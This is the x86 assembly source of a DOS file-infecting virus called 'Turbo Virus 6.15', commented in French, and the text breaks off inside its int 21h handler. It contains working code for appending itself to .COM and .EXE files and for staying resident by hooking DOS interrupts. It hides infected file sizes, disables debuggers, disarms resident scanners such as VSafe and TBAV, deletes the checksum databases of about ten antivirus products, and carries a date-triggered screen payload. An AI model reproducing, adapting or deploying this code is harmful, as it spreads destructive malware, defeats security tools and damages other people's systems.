;====================== Turbo Virus ================================
;====================== Prevu pour etre compil‚ avec org 0 =========

;=== En ce ki concerne la pile ne pas oublier ke d'autres prog s'en serve
;=== ne pas la baisser de trop.

;=== NOTE: Le virus doit mettre moins de TimeMin a s'executer sinon gare au
;===       jump de retour en resident!!!
;===       ATTENTION pour une raison plus ou moins inconnue ne pas baisser
;===       TimeMin de trop sinon ca devient *TRES* instable sous WinDaube(tm)

;=== Attention aux ASSUME, les variables seront adresses par SS c'est plus
;=== simple et moins long, BP sert donc d'index.

;========================= Constantes Diverses et variees
MemSign         EQU     236h            ;Adresse de la Signature r‚sidente
MarkMem         EQU     0DEh            ;Signature r‚sidante
NellInt         EQU     0D4h            ;Interruption abritant l'int 21h
MyStackSize     EQU     100             ;Taille de la pile
TimeMin         EQU     100             ;Temps Mini en ticks

;===================== Turbo Virus 6.15
.186
jumps
locals

;===================== Segment de Code
TVir    Segment
	Org 0
	Assume cs:TVir, ds:TVir, ss:TVir, es:Nothing

Start:

V_Start:    ;======== Label pour l'engine: Debut du fichier recopie
	    ;======== (pour calcul de taille)

decrypt:    ;======== Label pour l'engine: Decrypteur
		jmp     file_start

		org     decrypt + 200

	header          dw      8h / 2 dup(9090h)

File_Start: ;======== Label pour l'engine: Debut du cryptage

	;====== Initialisation de bp
Decal:
	mov bp,0
	
	;============= Mise en place d'une pile potable !!!
	;============= Pour les .EXE unikement
	cmp bp,100h
	jae ItsACom
	mov cs:TempoPile[bp],cs
	mov ss,cs:TempoPile[bp]
	lea sp,newstack[bp]
ItSACom:

	;=== Alloue de la memoire pour les var temporaires dans  
	;=== certains .EXE        
	mov bx,es
	dec bx
	mov ds,bx
	mov bx,ds:[3]
	add bx,((offset end_of_tvir_in_mem-offset End_of_tvir)/16)+1
	mov ah,4ah
	int 21h

;===========================================================================
;============================ PROGRAMME PRINCIPAL ==========================
;===========================================================================
;======================= Routine de d‚marrage: Arrivee des fichiers
	;================== Init de recurse pour kan le vir est
	;================== deja en memoire
	mov recurse[bp],0              ;== Ne VRAIMENT pas toucher !!!

MyInterruptEntryPoint:
	;======== Setting de ds=cs
	push cs
	pop ds

	;========= Pr‚paration anti d‚buggage
	push 4
	push 2
	
	;=========== Sauvegarde de es pour bidouille m‚moire
	mov startes[bp],es
	
	;========== Incr‚mentation des chaines
	cld

	;======== Sauvegarde du jump de retour
	Call Savejump

;===========================================================================
;============================= MISE EN RESIDENT (STEALTH) ==================
;============================= DS=0
;===========================================================================
	push 0
	pop ds
	
	;=== Nikage de l'int 03h&01h sp‚cial Debugeur
	pop cx
	pop bx
	
nodebug:
	xchg word ptr ds:[bx+2],dx
	add bx,8
	loop nodebug
	
	;==== D‚ja en m‚moire ?
	cmp byte ptr ds:[MemSign],MarkMem
	je inmemend

	;=== verif pour TBDriver (teste avec v6.26, 6.25 (386), 6.30)
	mov al,20h
	Call Getint

	mov di, NbrMem*2
	
NextMem:
	sub di,2

	mov si, ListMem[bp+di]

	cmp byte ptr es:[si],0EAh
	jne clean1
	mov bx,word ptr es:[si+1]
	mov ax,word ptr es:[si+3]
	jmp allClean
clean1:        
	or di,di
	jnz NextMem
	
	;=============== Stockage nouvelle interruption 21h
	mov al,21h
	Call GetInt
	mov ax,es

AllClean:        
	mov word ptr ds:[NellInt*4],bx
	mov word ptr ds:[nellint*4+2],ax

	;============== Ecriture fu jmp far to dos
	mov word ptr cs:[originalInt21+1],bx
	mov word ptr cs:[originalInt21+3],ax

	;======== D‚sallocation de la m‚moire
	;==== Sauvegarde taille du bloc original
	mov ax,startes[bp]
	dec ax
	mov es,ax
	mov ax,es:[3]
	mov Dummy[bp], ax

	;======= Calcul taille de d‚sallocation
	mov ax,startes[bp]
	push cs
	pop bx
	sub bx,ax

	lea dx,End_Of_tvir_In_Mem[bp+15]
	shr dx,4
	add bx,dx
	inc bx
	mov ah,4ah
	mov es,startes[bp]
	int 21h

	;========= Allocation d'un bloc de m‚moire pour stocker le virus
	;========= JE VEUX LES UMBs !!!!
	mov ax,5803h
	mov bx,1
	int 21h

	mov bx,0000000010000001b ;Meilleur bloc dans les UMBs
TryAnotherAlloc:
	push bx
	mov ax,5801h
	int 21h

	mov bx,Offset End_Of_Tvir_In_Mem+15
	shr bx,4
	inc bx
	mov ah,48h
	int 21h
	pop bx
	jnc AllocIsGood

	cmp bx,0000000000000010b
	je FastExit
	mov bx,0000000000000010b ;last fit in low mem yo man !!!!
	jmp TryAnotherAlloc

AllocIsGood:
	push bx    ;===== Sauvegarde de la taille allou‚e
	push ax    ;===== Segment allou‚.

	;========= JE VEUX PLUS LES UMBs !!!!
	mov ax,5803h
	xor bx,bx
	int 21h

	;====== Marquage de la m‚moire
	mov byte ptr ds:[MemSign],MarkMem

	;=================== Initialisation des variables r‚sidentes
	;=================== Recurse deja initilise
	mov counter[bp],0
	mov counter2[bp],0
	mov UltraStealth[bp],0
	mov Infectious[bp],0

	mov ah,2ah
	int 21h                         ;= date ?
	test dh,1                       ;= Mois
	jnz NoDeclench
	test al,1                       ;= Jour
	jz Nodeclench
	or counter2[bp],10000000b
Nodeclench:

	;======== Recopie du virus a sa nouvelle place
	push cs
	pop ds

	pop ax
	push ax

	mov si,bp
	mov es,ax
	xor di,di
	mov cx,offset end_of_tvir_in_mem
	rep movsb

	;======= Sauvegarde int 1Ch
	mov al,1Ch
	Call GetInt

	;======= Ecriture des adresses dans la partie r‚sidente
	pop ds ;int 1Ch
	mov word ptr ds:[offset Int1CAddr+1],bx
	mov word ptr ds:[offset Int1CAddr+3],es

	;====== Jmp de retour
	mov word Ptr ds:[offset ReturnFromTsr+1],offset int21go

	;===== Set Int 21h & int 1Ch & Int 20h & int 27h
	mov al,21h
	mov dx,offset myint21entrypoint
	Call SetInt
	mov al,1Ch
	mov dx,offset myint1C
	Call SetInt
	mov al,20h
	mov dx,offset myint20
	Call SetInt
	mov al,27h
	mov dx,offset myint27
	Call SetInt

	;==== Reallocation
	pop dx
	inc dx
	mov ah,4ah
	mov bx,Dummy[bp]
	sub bx,dx
	mov es,StartEs[bp]
	int NellInt

	mov cx,0DEADh

inmemend:
	;================= Setting DS=CS
	push cs
	pop ds

	;==== Remise en marche de la strat‚gie normale
	mov ax,5801h
	xor bx,bx
	int NellInt

;===========================================================================
;============================= INIT DIVERSES ET VARIEES ====================
;============================= DS doit etre egal … CS   ====================
;===========================================================================
	cmp cx,0DEADh    ;= Vient d'etre insatll‚ ?
	je nolaunch      ;= Oui ? recherchge de comspec
	cmp recurse[bp],0 ;= Non ? si pas resident, on se casse
	je Fastexit

nomem:
	;==== Kickage du module r‚sident de MSAV et CPAV !!!
    mov ax,0FA02h
    mov dx,5945h
    mov bl,0
    int 16h
    mov OldVsafe,cl

	;======= D‚termination de l'adresse de la DTA
	Mov ah,2Fh
	int NellInt

	mov DtaOfs,bx
	mov DtaSeg,es

	;====== Set New Dta
	mov dx,offset MyDta
	Mov ah,1Ah
	int NellInt

	;====== Sauvegarde du r‚pertoire courant
	mov ah,47h
	xor dl,dl
	mov si,offset orgdir
	int NellInt

	;======== Sauvegarde du handler critique
	mov al,24h
	Call GetInt
	mov int24o,bx
	mov int24s,es

	;========= Setting de mon handler a moi
	mov al,24h
	mov dx,offset MyInt24
	Call SetInt

	push ds
	mov dx,Dummy2
	mov ds,Dummy

	push ds
	push dx
	
	;=================== Recherche du backslash de fin
	Call BackSearch

	xchg si,dx
	
	push cs
	pop es

	;===================== Copie du path dans le buffer
	mov di,offset DBVDir
	mov cx,dx
	sub cx,si
	rep movsb
	mov al,0
	stosb
	
	;==================== On va dans le repertoire du programme 
	push cs
	pop ds
	mov dx,offset DBVDir
	Call SetRep
	
	pop dx
	pop ds

	Jmp Launch
;========================================================================
;==================== RECHERCHE DE COMSPEC ==============================
;========================================================================
NoLaunch:                
	;======= Recherche de COMSPEC
	mov es,StartES[bp]
	mov ax,Word Ptr es:[2Ch]
	mov es,ax
	xor di,di
gato1:
	mov cx,500
	mov al,'C'      ;===== Recherche du C
	repne scasb
	jcxz No_Infection_2
	
	mov cx,7
	lea si,comspec[bp]
	repe cmpsb
	jcxz found
	jmp gato1

found:                       ;=== Compspec trouve
	push ds
	push es
	pop ds
	xchg dx,di

	mov ax,3D00h
	int 21h              ;======= Doit etre l'int 21h originale

	xchg bx,ax
	Mov ah,3Eh
	int 21h
	
	pop ds

	jmp FastExit

;========================================================================
;==================== DISPATCHEUR RESIDENT ==============================
;==================== WARNING :   DS<> CS  ==============================
;========================================================================
Launch:
	Call ChkName
	jc @St
	Call Setatt 
	jc protected           ;= Support protege contre l'‚criture ?

	;================= Ouverture
	mov ax,3D00h
	int NellInt
	mov handle[bp],ax
	Call Set_Sft
	mov word ptr es:[di+2],42h
	pop ds
	
	mov cx,NbrFI*2+1
	push cx
	jmp DirectHit

protected:
	pop ds
	jmp OneAgain            ;= Oui, on en prend un dans le repertoire
				;= courant

@St:
	pop ds
	cmp buf,0AAh   ;==== Open ou exec ?
	jne OneAgain

	inc UltraStealth    ;====== Mode UltraStalth (tm) ON
	mov buf,0           ;====== car exec

;===========================================================================
;============================= PROCESSUS DE RECHERCHE ======================
;============================= DS doit etre egal … CS ======================
;===========================================================================
OneAgain:
	;======== Processus de recherche
	mov cx,NbrFI*2                ;= CX=Nbr de fichier a recherche*2
	
NextFI:
	sub cx,2

	mov bx,offset TABLEFI
	add bx,cx
	mov dx,[bx]
	push cx

	;======= Recherche fichiers
	mov ah,4Eh
	mov cx,00000111b                ;Tout les types de fichiers
	int NellInt
	jc KeFaire
	
LetsGo:        
	;======== Chargement du nom
	mov dx,offset MyDta+30
	
	;=========== teste pour le type de fichier
	Call CHkNAme
	jc Get_Another_2

	;========== Setting attribut et verif de la protection en ecriture
	Call Setatt
	jc No_Infection_3      ;=== Support prot‚g‚ contre l'‚criture

	;======== On a trouve un fichier, on l'ouvre
	mov ax,3D00h
	int NellInt
	mov handle,ax
	Call Set_SFT
	mov word ptr es:[di+2],42h

DirectHit: ;===== Arrivee d'une attak residente
	;================ Signature ?
	mov ax,5700h
	mov bx,handle
	int NellInt
	Call IsInfect
	jc Get_Another
	
	;========================== Lecture du header
	mov dx,offset buf
	mov cx,18h
	mov ah,3Fh
	mov bx,handle
	int NellInt
	
	;=========================== Detection du type de fichier
	cmp word ptr buf,'ZM'
	je ExeVerif
	cmp word ptr buf,'MZ'
	je ExeVerif
	jmp ComVerif

KeFaire:
	;========= Eh oui que faire ?
	pop cx            
	or cx,cx
	jnz NextFI

	;========= Visite du r‚pertoire parent
	mov dx,offset father
	Call SetRep
	jc No_infection_2
	jmp OneAgain

Get_Another:        
	;========== Ferme fichier pas bon
	Mov ah,3Eh
	mov bx,handle
	int NellInt

Get_Another_2:
	;========== Recherche prochaine occurence
	pop cx
	cmp cx,NbrFi*2+1
	je OneAgain

	push cx
	mov ah,4Fh
	int NellInt
	jc Kefaire
	jmp LetsGo

No_Infection_3:        
	pop cx
No_Infection_2:
	jmp exit

;========================================================================
;===========================   COM    ===================================
;========================================================================
ComVerif:        
	;=========== Verif pour Jump
	cmp buf,0E9h
	jne Get_Another

	;=========== V‚rification pour la taille
	Call Fin
	mov word ptr dummy,ax
	add ax,offset End_Of_Tvir+MyStackSize ;== Taille du virus+stack
	jc Get_Another

;===========================================================================
;=================================== INFECTION COM =========================
;===========================================================================

	;======= D‚termine la taille du fichier source
	mov ax,word ptr dummy
	push ax

	;======= Enregistrement dynamique du d‚calage avant r‚plication
	add ax,100h             ;===== PSP ! :)
	mov word ptr decal[1],ax
	
	;===== Mise en place des variables de saut a l'ancien programme
	mov ax,word ptr buf[1]
	add ax,103h
	mov word ptr ReturnFromTsr[1],ax

	;====== Copie du Virus
	xor bx,bx   ;===== Pas un .EXE
		    ;===== Ax = Size of.com+decrypteur
	pop ax
	push ax
	add ax,offset File_Start-Decrypt+100h ;=== PSP
	Call CopyVir


	;====== Ecriture du nouveau Header .COM
	Call Debut
	pop ax   ;= On recupere la taille
	sub ax,3
	mov Word Ptr buf[1],ax

	mov cx,3
	mov dx,offset buf
	Call Write

	jmp TerminateJob

;===========================================================================
;=============================  EXE   ======================================
;===========================================================================

EXEVerif:
	;======== V‚rification pour la taille
	Call Fin
	push ax  ;==Sauvegarde de la taille reelle
	push dx
	
	mov ax,512
	mul Word Ptr buf[4]

	add ax,word ptr buf[2]
	adc dx,0

	pop cx
	pop bx
	sub ax,bx  ;======= Soustraction des 2 tailles
	sbb dx,cx

	or dx,dx
	jnz Get_Another

;=============================================================================
;============================ INFECTION EXE ==================================
;=============================================================================
	;========= Calcul de HSize en octets
	mov ax,16
	mul Word Ptr buf[8h]

	xchg bx,ax
	xchg cx,dx
	
	;====== Super soustraction 32-bits EXESIZE-HSIZE
	sub ax,bx
	sbb dx,cx 

	;======== Calcul nouveau CS:IP
	mov cx,16
	div cx
	mov Word Ptr dummy2,ax      ; l… c'est CS=dummy2
	mov word ptr Dummy,dx       ; suffit de savoir lire ici dummy=ip

	;==== Gare a l'ordre des 3 blocs qui suivent
	;======== Enregistrement du d‚calage bp avant la copie
	mov word ptr decal[1],dx
	push dx        ;= sauvegarde de bp pour usage ulterieur

	;======== Initialisation des champ de retour avant la copie
	mov bx,ax
	sub bx,word ptr buf[16h]       ;= pour cs: AX=dummy2=new cs
	mov word ptr BackToExe[3],bx

	sub ax,word ptr buf[0Eh]     ;= Pour SS
	mov word ptr BackToExe[16],ax

	mov ax,word ptr buf[10h]             ;= pour sp
	mov word ptr a1[4],ax

	mov ax,word ptr buf[14h]              ;= Pour IP
	mov word ptr a1[1],ax

	;======== Ecriture de SS:SP
	mov ax,word ptr dummy2    ;== SS special pour tbav
	sub ax,30h
	mov word ptr buf[0eh],ax

	mov Word Ptr buf[10h],offset NewStack+300h  ;== SP
	pop ax                                       ;= r‚cuperation de bp
	add Word ptr buf[10h],ax ;= on additione/soustrait le futur bp

	;=========== Deplacement et ecriture new CS:IP
	mov ax,dummy
	mov bx,dummy2
	mov word ptr buf[14h],ax
	mov word ptr buf[16h],bx

	;======== Copie du virus
	mov bx,8000h ;== Signale a l'engine ke c'est un .EXE
	mov ax,dummy
	add ax,offset File_Start
	Call CopyVir

	;======== MAJ de la taille de l'exe
	Call Fin

	mov cx,512
	div cx

	inc ax

	mov word ptr buf[2],dx
	mov word ptr buf[4],ax

	;===== Remise au d‚but du fichier source
	call debut        
	
	mov cx,18h
	mov dx,offset buf
	Call Write

;===========================================================================
;============================== TERMINAISON  ===============================
;============================== DS doit etre = … CS ========================
;===========================================================================
TerminateJob:
	;============== Stabilisation de la pile
	pop cx
	
	;========== lecture heure
	mov ax,5700h
	mov bx,handle
	int nellint

	;========== Setting heure =hh:mm:SS
	mov ax,5701h
	and cx,1111111111100000b
	or cl,(3+4)
	int nellint

	;===========  Fermeture des fichiers
	Mov ah,3Eh
	mov bx,handle
	int NellInt

	;========== Raz de la minuterie aprŠs infection
	mov Counter2,0

;=========================== On se casse kar infection rate/reussie
Exit:
	;======= DS doit etre egal … CS
	;======= D‚struction des bases de donn‚es de certains antivirus
	;======= Apr‚s infection
	mov cx,NbrDBV*2        ;cx=Nbr dbv*2
ProchainDBV:
	sub cx,2

	;======= Selection de la chaine de recherche
	mov bx,offset tableDBV
	add bx,cx
	mov dx,[bx]
	push cx

	;======= Recherche de dbvx
	mov ah,4Eh
	mov cx,00000111b                ;Tout les types de fichiers
	int NellInt
	jc pasdedbv

	;======== RAZ de l'atribut de la cible
	mov dx,offset MyDta+30
	Call SetAtt

	;======== DESTRUCTION !!!!
	mov ah,41h
	mov dx,offset mydta+30
	int NellInt

pasdedbv:
	pop cx
	or cx,cx
	jnz ProchainDbv

	;========= Restauration du r‚pertoire initial
	mov dx,offset root
	Call SetRep

	mov dx,offset orgdir
	Call SetRep

	;========= Remise en fonction de l'ancien handler d'erreur
	mov al,24h
	push ds
	mov ds,int24s[bp]
	mov dx,int24o[bp]
	Call SetInt
	pop ds

	;========== Raz de la Dta
	mov dx,DtaOfs
	push ds
	mov ds,DtaSeg[bp]
	Mov ah,1Ah
	int NellInt
	pop ds

FastExit:
	;========= V‚rification pour protection intrinseque
	;========== On s'occuppe de l'innoculation CPS V2.00 des .EXE
	;=== VSAFE 2 en particulier !!!
	;===== pour les EXE
	push cs
	pop ax
	sub ax,39h
	mov es,ax
	cmp word ptr es:[0BEh],6FE8h
	jne CPS2
	mov word ptr es:[0BEh],0FFE9h
	mov Byte ptr es:[0C0h],0
	jmp NoInnoc

CPS2:
	;====== Idem pour les COM
	cmp Word ptr [bp-1CDh],0373h
	jne NoInnoc
	mov Word Ptr [bp-1CDh],9090h

NoInnoc:
    ;========= Restauration des options de VSafe
    cmp recurse[bp],0
    je @@NoVFuck
    mov ax,0FA02h
    mov dx,5945h
    mov bl,OldVsafe
    int 16h
@@NoVFuck:
	;========= Restauration du jump de retour
	Call restoreJump

	;========= Restauration De ES
	mov es,StartES[bp]

	;======== Ou Va t'on
	cmp recurse[bp],0
	jne ReturnFromTSR

	cmp bp,100h
	jb BackToExe

;========================= Instructions de retour au programme appelant
ReturnFromTSR:                  ;== instructions de saut pour .COM
				;== ou module r‚sident
	Mov bx,0000
	Jmp Bx
EndReturnFromTsr:

BackToExe:                      ;== Instructions de saut pour .EXE
	push cs
	pop ax
	sub ax,0010h            ;=== Retour au dos par CD20=Int 20h
	mov bx,ax

a1:
	mov cx,0000
	mov dx,0000
	
	push ss
	pop ax
	sub ax,0000
endsave:        
	push es
	pop ds

	push ax
	pop ss

	mov sp,dx
	
	push bx
	push cx
	retf
EndBackToExe:

;============================ Constantes
Banzai  DB '[Sodomizator/T.Power] Do you like me ?'
Father  DB '..',0
Root    DB '\',0
ComSpec DB 'OMSPEC='

;=========================== Fichiers recherch‚s Pour l'infection
NbrFI   EQU     2

TableFI         DW F_Com
		DW F_Exe

F_Com DB '*.COM',0
F_Exe DB '*.EXE',0

;========================= Emplacements m‚moires … surveiller pour fucker
;========================= les antivir r‚sidents : jmp far to dos
NbrMem  EQU 6

ListMem DW 02B4H        ; tbav 6.25 & 6.26 & 6.30 et +
	DW 028AH        ; tbav 6.25(386) et +
	DW 0292H        ; tbav 6.35
	DW 0268H        ; Tbav 6.35 (386)
	DW 020AH        ; Tbav 6.35 (286&186)
	DW 022CH        ; Tbav 6.35 (86)

;========================= Chaines contenant un certain nbr de base
;========================= de donn‚es d'antivirus
NbrDBV  EQU     10

TableDBV        DW DBVir1
		DW DBVir2
		DW DBVir3
		DW DBVir4
		DW DBVir5
		DW DBVir6
		DW DBVir7
		DW DBVir8
		DW DBVir9
		DW DBVir10

DBVir1  DB 'SMARTCHK.*',0         ; MSAV & CPAV
DBVir2  DB 'CHKLIST.*',0          ; Idem
DBVir3  DB 'ANTI-VIR.DAT',0       ; TBAV
DBVir4  DB '*.VIR',0              ; ? G‚n‚rique
DBVir5  DB 'NAV_._*',0            ; NAV 2.0
DBVir6  DB '*.IM',0               ; Integrity Master
DBVir7  DB '*.NTZ',0              ; InVircible
DBVir8  DB 'FI*.FF?',0            ; Salomon toolkit
DBVir9  DB '*.CRC',0              ; AVP
DBVir10 DB '_CHK.CHK',0           ; F-Prot Professional

;======================== Fichiers a ne pas infecter, d‚clenchement de
;======================== l'UltraStealth mode (tm)
NbrHF   EQU     13

TableHF         DW HF1
		DW HF2
		DW HF3
		DW HF4
		DW HF5
		DW HF6
		DW HF7
		DW HF8
		DW HF9
		DW HF10
		DW HF11
		DW HF12
		DW HF13

HF1     DB 'SCAN',0 ;generique
HF2     DB 'F-',0   ;f-prot
HF3     DB 'VIR',0  ;generique
HF4     DB 'VS',0   ;vshield
HF5     DB 'AV',0   ;generique
HF6     DB '.S',0   ;io.sys, msdos.sys
HF7     DB 'BMB',0  ;ibmbio.com
HF8     DB 'BMD',0  ;ibmdos.com
HF9     DB 'TB',0   ;tbav
HF10    DB 'IM',0   ;integrity master
HF11    DB 'IV',0   ;invircible & Salomon (viverify)
HF12    DB 'DECO',0 ;Test-Decoy
HF13    DB 'TBSCAN.',0;Tbscan pour parametres

;========= "Correction" de la ligne de commande de TBAV :)
TBAVTailFix  db ' co nm',0Dh

;========================================================================
;=========================== SOUS-PROGRAMMES ============================
;========================================================================
CopyVir Proc Near        ;======= Recopie du code du virus dans le source

    push bp
    xchg bp,bx    ;===== bx octet d'atribut

    push cs
    pop es

    push ax      ;==== ax=ip
    in al,21h
    or al,1
    out 21h,al
    pop ax
    
@@LoopInfect:
    push ax
    push bp
    Call Engine
    pop bp
    pop ax
    jc @@LoopInfect

    in al,21h
    and al,11111110b
    out 21h,al

    pop bp

	ret
CopyVir endp
	
BackSearch proc near
	;===== Recherche du BackSlash
	mov si,dx
@@SearchNull:
	lodsb
	or al,al
	jnz @@SearchNull
	
	std
	lodsw   ;Si=Si-2

@@SearchBack:
	cmp si,dx
	jl @@NoSlash
	lodsb
	cmp al,'\'
	jne @@SearchBack
	
@@NoSlash:
	cld
	lodsb ;==== DS:SI pointe sur le backslash
	 
	ret
BackSearch Endp

ChkName Proc Near
	Call BackSearch

	xchg ax,si

	push cs
	pop es

	mov cx,NbrHF*2
Nest:
	mov si,ax
	sub cx,2
	mov bx,offset TableHF
	add bx,cx
	mov di,es:[bx]
	mov bx,di
	inc di
_4:        
	dec di

	cmp Byte Ptr es:[di],0
	je _6
	
	mov di,bx
	
	cmp Byte Ptr [si],0
	je _7

_5:        
	cmpsb
	jne _4
	jmp _5
_7:
	or cx,cx   
	jnz nest
	
	clc             ;=== Clear Carry Flag
	ret

_6:                   
	stc             ;=== Set Carry Flag, fichier non infectable
	ret
ChkName endp

savejump proc near
	 lea si,ReturnFromTSR[bp]
	 lea di,buf2[bp]
r:         
	 push cs
	 pop es
	 mov cx,offset endsave-offset ReturnFromTSR
	 rep movsb
	 ret
savejump endp

restorejump proc near
	    lea si,buf2[bp]
	    lea di,ReturnFromTSR[bp]
	    jmp r
restorejump endp

Fin     Proc Near       ;Mise a la fin du source
	mov al,02h
deb:
	mov ah,42h
	mov bx,handle
	xor cx,cx
	xor dx,dx
	int NellInt
	ret
Fin     endp

Debut   Proc Near
	;===== Remise au d‚but du fichier source
	xor al,al
	jmp deb
Debut   endp

Write   Proc Near       ;Ecriture … partir de ds:dx de cx octet dans le source
	mov ah,40h
	mov bx,handle
	int NellInt
	ret
Write   endp

GetInt  Proc Near
	mov ah,35h
	int 21h
	ret
GetInt  endp

SetInt  Proc Near
	mov ah,25h
	int Nellint
	ret
SetInt  endp

SetRep  Proc Near
	mov ah,3Bh
	int NellInt
	ret
SetRep  endp

Setatt  Proc Near
	mov ax,4301h
	mov cx,0000000000100000b  ; = archive
	int NellInt
	ret
Setatt  endp

IsInfect proc near
	 shl cl,3
	 cmp cl,00111000b
	 je ouais
	 clc
	 ret
ouais:
	 stc
	 ret
IsInfect endp

Set_sft        Proc Near
		;= AX=Handle
		push ax bx
		
		mov     bx,ax
		mov     ax,1220h
		int     2fh                     ; get DCB number address
		jc SFTFailed
		mov     ax,1216h
		mov     bl,es:[di]              ; get DCB number
		int     2fh                     ; get DCB address
SFTFailed:                
		pop bx ax
		ret
set_sft         endp

;===========================================================================
;=========================  INTERRUPTIONS  =================================
;===========================================================================

;===========================================================================
;=========================== INT 20h =======================================
;===========================================================================
MyInt20 Proc Far
	xor ax,ax
	jmp Terminate
MyInt20 endp

;===========================================================================
;=========================== INT 27h =======================================
;===========================================================================
MyInt27 Proc Far
	mov ah,31h
	shr dx,4
	inc dx
	jmp Terminate
MyInt27 endp

;===========================================================================
;=========================== INT 1Ch =======================================
;===========================================================================

MyInt1C Proc far

	cmp byte ptr cs:[recurse],0
	je wuite
	
	dec byte ptr cs:[recurse]

wuite:
	cmp Word Ptr cs:[Counter2],10000101b
	je Zarma 

	inc cs:[counter]
	jnz Int1CAddr
	
	inc cs:[counter2]
	
Int1CAddr:        
	db 0EAh,00,00,00,00
Zarma:
	pusha        
	mov dx,03dah
@@Vbl:
	in al,dx
	and al,8
	jz @@Vbl

	mov dx,3d4h
	mov ax,0dh
	out dx,ax
	
	mov ax,10
	Call Random
	inc dx
	out dx,ax

	popa
	jmp Int1CAddr
MyInt1C endp

;===========================================================================
;=========================== INT 21h =======================================
;===========================================================================
Myint21 Proc far
;============================ Stealth FIND
Stealth1:
	int nellint

	pusha
	pushf
	push es
	jc StealthDone

	Mov ah,2Fh
	int nellint
	
	mov cx,word ptr es:[bx+22]
	Call Isinfect
	jnc StealthDone
	
	cmp word ptr es:[bx+26],offset End_Of_Tvir
	ja @j1
	cmp word ptr es:[bx+28],0
	jna StealthDone

@j1:
	sub word ptr es:[bx+26],offset End_Of_Tvir
	sbb word ptr es:[bx+28],0
	
	cmp byte ptr cs:[offset UltraStealth],0
	je StealthDone
	
	pop es
	popf
	popa
	
	mov ah,4Fh
	jmp stealth1   ; Tsss Tsss d‚sol‚ msieur l'antivir mais celui la est
		       ; pas pour vous. !!!
StealthDone:
	pop es
	popf
	popa
	
	ret 2

;==================== Stealth FCB

Stealth2:
	int nellint
	
	pusha
	pushf
	push es

	xchg bx,dx
	xor si,si

	cmp byte ptr [bx],0FFH
	jne fcbnorm
	mov si,7

fcbnorm:

	Mov ah,2Fh
	int nellint

Stealth3_EP:
	mov cx,word ptr es:[bx+23+si]
	call isinfect
	jnc StealthDone
	
	cmp word ptr es:[bx+29+si],offset End_Of_Tvir
	ja @j2
	cmp word ptr es:[bx+31+si],0
	jna StealthDone

@j2:
	
	sub word ptr es:[bx+29+si],Offset End_Of_Tvir
	sbb word ptr es:[bx+31+si],0
	jmp StealthDone

;================================ Stealth GETSIZE

Stealth3:
	int nellint
	
	pusha
	pushf
	push es

	test al,0FFH
	jnz StealthDone

	cmp byte ptr [bx],0FFH
	jne fcbnorm2
	mov si,7
fcbnorm2:
	push ds
	pop es
	jmp Stealth3_EP

;===========================  DISPATCHEUR :)

Myint21EntryPoint:

	;==================== Fuck the AVP Tunnelling
	cli
	push bx
	push bp
	push ax
	pop ax
	mov bp,sp
	mov bx,[bp-2]
	cmp ax,bx
	pop bp
	pop bx
	jne Int21FarJMP
	
	;==================== My Handler kernel
	cmp ah,011h
	je Stealth2          ;= Findfirst FCB

	cmp ah,012H          ;== Findnext FCB
	je Stealth2

	cmp ah,23h
	je Stealth3          ;==== Get FileSize FCB   

	cmp ah,04Eh
	je Stealth1            ;= FindFirst Handle
	
	cmp ah,04Fh            ;= FindNext handle
	je stealth1
	
	cmp ah,4Ch
	je Terminate             ;= Terminate

	cmp ah,31h
	je Terminate            ;= Terminate : TSR

	cmp ah,00h
	je Terminate             ;= Terminate

	cmp ax,4B00h            ;= EXEC
	je GoInfect_1bis           

	cmp cs:[offset recurse],0   ;A partir d'ici on temporise
					 ;question de discretion
	jne CallDos

	cmp ah,3Dh              ;==== Open
	je GoInfect_1

	cmp ax,6C00h            ;=== Open etendu
	je GoInfect_3
	
;========================== Retour Au "Vrai" DOS
CallDos:
	pusha
	push ds
	push es

    ;=============== Ajout des parametres sur la ligne de comande
	push bx
	cmp ax,04B00h
	jne NoFuckParam
	Call ChkName
	cmp cx,12*2    ;== Tbscan ??
	jne NoFuckParam
	
	pop bx        ;=recupere bx
	pop es
	push es       ;=recupere Es
	lds si,es:[bx+2]    ;==== ds:si Command Tail

    mov di,si
    inc di
    mov al,byte ptr ds:[si]
    cbw
    add di,ax
    add byte ptr ds:[si],6

    push ds
    pop es
    push cs
    pop ds
    mov si,offset TBAVTailFix
    mov cx,7
    rep movsb
    push bx

NoFuckParam:
	pop bx

    ;====== OWN MCB !!!
	push cs
	pop ax
	dec ax
	mov ds,ax
        mov word ptr ds:[1],8

	pop es
	pop ds
	popa

Int21FarJMP:
	;============ Sauvegarde du numero de fonction
	mov byte ptr cs:[buf+1],ah

	;============ On Appelle le dos ! kel bordel !
	push bp
	mov bp,sp
	push [bp+6]
	popf
	pop bp

	int NellInt   ;= Call dos

	pushf
	push es
	pusha

	;==================== Stealth SFT
	cmp cs:[offset UltraStealth],0
	je NoSftStealth
	cmp cs:[buf+1],3Dh
	je DoSftStealth
	cmp cs:[buf+1],6Ch
	jne NoSftStealth
DoSftStealth:
	Call Set_Sft
	jc NoSftStealth
	mov cx,word ptr es:[di+13]
	Call IsInfect
	jnc NoSftStealth

	cmp word ptr es:[di+17],offset End_Of_Tvir
	ja SftStealth
	cmp word ptr es:[di+19],0
	je NoSftStealth
SftStealth:
	sub word ptr es:[di+17],offset end_Of_Tvir
	sbb word ptr es:[di+19],0

NoSftStealth:
	;================ UnOwn MCB !
	push cs
	pop ax
	dec ax
	mov es,ax
        mov word ptr es:[1],0

	popa
	pop es
	popf

	retf 2

;===================== Terminate
Terminate:

	cmp byte ptr cs:[offset Infectious],0
	je Pif
	dec byte ptr cs:[offset Infectious]    ;= Infectious ON
Pif:        
	cmp byte ptr cs:[offset UltraStealth],0 
	je Plifou
	dec byte ptr cs:[offset UltraStealth]    ;= Ultra Stealth Mode off
plifou:

OriginalInt21:
	db 0EAh,00,00,00,00    ;= JMP FAR

;======================
GoInfect_1bis:
	cmp cs:[infectious],0   ;============= Systeme Anti IV-Test
	jne IvInProgress

	pusha
	push es

	Call ChkName      ;========= Verification: Invicible, IVTEST
	cmp cx,10*2       ;========= oui, stop infection
	jne NoIV

IVStart:
	pop es
	popa             

IVinProgress:
	inc cs:[UltraStealth]
	inc cs:[infectious]
	jmp Calldos
NoIV:
	pop es
	popa             
	mov cs:[offset buf],0AAh    ;==== execution

GoInfect_1:
	mov cs:[offset Dummy],ds
	mov cs:[offset Dummy2],dx
	jmp GoInfect

GoInfect_3:
	mov cs:[offset Dummy],ds
	mov cs:[offset Dummy2],si

GoInfect:
	cmp cs:[Infectious],0  ;=== Infection mode ON ?
	jne CallDos
	
	mov byte ptr cs:[offset recurse],TimeMin

	pusha
	push ds
